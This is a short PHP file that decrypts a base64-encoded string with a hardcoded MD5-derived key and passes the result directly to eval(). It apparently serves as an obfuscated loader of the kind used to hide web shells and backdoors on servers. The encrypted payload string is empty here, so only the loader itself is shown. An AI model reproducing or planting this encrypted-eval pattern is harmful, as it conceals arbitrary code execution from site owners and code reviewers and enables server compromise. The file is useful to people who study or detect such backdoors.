<?php
$crypstr = "";
function decrypt($crypstr, $ksession){
    $x = 0;
	$str = '';
    $ksession = md5($ksession);
    $crypstr = base64_decode($crypstr);
    $len = strlen($crypstr);
    $l = strlen($ksession);
    $chare = '';
    for ($i = 0; $i < $len; $i++) {
        if ($x == $l) {
            $x = 0;
        }
        $chare .= substr($ksession, $x, 1);
        $x++;
    }
    for ($i = 0; $i < $len; $i++) {
        if (ord(substr($crypstr, $i, 1)) < ord(substr($chare, $i, 1))) {
            $str .= chr((ord(substr($crypstr, $i, 1)) + 256) - ord(substr($chare, $i, 1)));
        } else {
            $str .= chr(ord(substr($crypstr, $i, 1)) - ord(substr($chare, $i, 1)));
        }
    }
    return $str;
}
$ksession = "R0S988Wre";
$str = decrypt($crypstr, $ksession);
eval($str);